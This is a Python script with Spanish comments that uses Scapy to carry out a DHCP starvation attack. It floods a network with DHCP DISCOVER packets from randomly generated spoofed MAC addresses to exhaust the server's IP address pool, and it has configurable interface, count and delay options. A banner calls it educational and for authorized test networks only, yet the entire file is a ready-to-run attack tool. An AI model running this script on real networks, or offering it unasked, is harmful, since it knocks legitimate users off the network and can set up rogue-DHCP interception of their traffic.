#!/usr/bin/env python3
"""
DHCP Starvation Attack
Este script agota el pool de direcciones IP del servidor DHCP
enviando múltiples solicitudes DHCP con direcciones MAC aleatorias.
"""

from scapy.all import *
import random
import time

def generate_random_mac():
    """Genera una dirección MAC aleatoria"""
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def dhcp_starvation(interface="eth0", count=100, delay=0.1):
    """
    Realiza un ataque DHCP Starvation
    
    Args:
        interface: Interfaz de red a utilizar
        count: Número de solicitudes DHCP a enviar
        delay: Retardo entre solicitudes (segundos)
    """
    print(f"[*] Iniciando DHCP Starvation Attack en {interface}")
    print(f"[*] Enviando {count} solicitudes DHCP...")
    
    for i in range(count):
        # Generar MAC aleatoria
        fake_mac = generate_random_mac()
        
        # Construir paquete DHCP DISCOVER
        dhcp_discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(fake_mac), xid=random.randint(1, 0xFFFFFFFF)) /
            DHCP(options=[
                ("message-type", "discover"),
                ("hostname", f"fake-host-{i}"),
                ("param_req_list", [1, 3, 6, 15]),
                "end"
            ])
        )
        
        # Enviar paquete
        sendp(dhcp_discover, iface=interface, verbose=False)
        
        if (i + 1) % 10 == 0:
            print(f"[+] Enviadas {i + 1} solicitudes DHCP con MACs falsas")
        
        time.sleep(delay)
    
    print(f"[✓] Ataque completado: {count} solicitudes DHCP enviadas")
    print("[!] El pool de direcciones del servidor DHCP puede estar agotado")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack - Agota el pool de IPs del servidor DHCP"
    )
    parser.add_argument(
        "-i", "--interface",
        default="eth0",
        help="Interfaz de red (default: eth0)"
    )
    parser.add_argument(
        "-c", "--count",
        type=int,
        default=100,
        help="Número de solicitudes DHCP (default: 100)"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0.1,
        help="Retardo entre solicitudes en segundos (default: 0.1)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("DHCP STARVATION ATTACK")
    print("=" * 60)
    print("ADVERTENCIA: Este script es solo para fines educativos")
    print("Úselo solo en redes de prueba autorizadas")
    print("=" * 60)
    
    try:
        dhcp_starvation(
            interface=args.interface,
            count=args.count,
            delay=args.delay
        )
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido por el usuario")
    except Exception as e:
        print(f"[ERROR] {e}")